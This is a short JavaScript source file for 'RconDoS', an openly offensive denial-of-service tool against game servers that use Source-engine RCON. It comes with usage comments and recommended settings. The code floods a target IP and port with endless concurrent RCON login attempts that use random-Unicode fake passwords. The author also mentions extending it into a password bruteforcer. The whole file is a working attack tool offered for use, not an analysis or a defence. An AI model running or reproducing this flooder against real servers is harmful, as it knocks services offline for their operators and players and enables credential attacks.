/* <3 <3 <3 USAGE INFORMATION~! <3 <3 <3 */

/* node rcondos.js -t <ip> -p <port> -s <payloadSize> -c <ThreadCount> -i <interval> */

/* I recommend the following: */

/* <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 */
/* node rcondos.js -t 127.0.0.1 -p 27015 -s 32 -c 100 -i 10                   */
/* <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 - - - <3 */

/* This will spam the server with fake pws every 10 milliseconds 100 times at the same time with a string of a length of 32 (Random Unicode Chars). ^^ */

/* Enough rambling and bambling~ coding time... */
/* We import our libraries, */
/* rcon for obvious reasons, minimist for argument parsing... */
import rcon     from "srcds-rcon";
import minimist from 'minimist';

/* Parse and put the args into vars. */
var argv = minimist(process.argv.slice(2));

/* Setup such... */
let argIP       = argv.t;   /* The IP! ^^ */
let argPort     = argv.p;   /* The Port! ^^ */
let argPLSiz    = argv.s;   /* How many characters do we wish to generate? */
let argCount    = argv.c;   /* How many concurrent flooding operations do we wish to perform? */
let argWait     = argv.i;   /* How fast (Interval-Wise) do we want to flood? */

/* We start! */
console.log(`RconDoS by Zarashigal!`); await new Promise(r => setTimeout(r, 1000));

/* Setup functions... */
/* This one makes us a sweet little payload. */
async function fuzzer(n) { return Array(n).fill(0).map(_ => String.fromCharCode(0x0000 + Math.random() * (0x0000-0xFFFFF+1))).join(''); }

/* Flooder... */
async function flooder(addr, p, interval) {

    /* Run the fuzzer with the argument of our wished size... */
    fuzzer(argPLSiz).then((payload) => {

        /* Flood address with false pw, being the payload we make using our fuzzer. */
        let rconClient = rcon({
            address: `${addr}:${p}`,
            password: payload
        });
        
        /* For further extension, i might make a rcon-bruteforcer with this, thus it would run a test command. */
        rconClient.connect().then((e) => {
            return rconClient.command('map gm_flatgrass');
        }).catch((x) => {
            console.error(x);
        });

    });

}

/* The functions are setup, we now attack. */
console.log(`Attacking: ${argIP}:${argPort}...`); 

/* Until infinity, that is. */
for (let x = 1; x < 9e999; x++) {

    /* Interval timeout, but async. */
    await new Promise(r => setTimeout(r, argWait));

    /* How many concurrent operations? */
    for (let x = 1; x < argCount; x++) {
        
        /* -> Flood! */
        flooder(argIP, argPort);
    
    }

}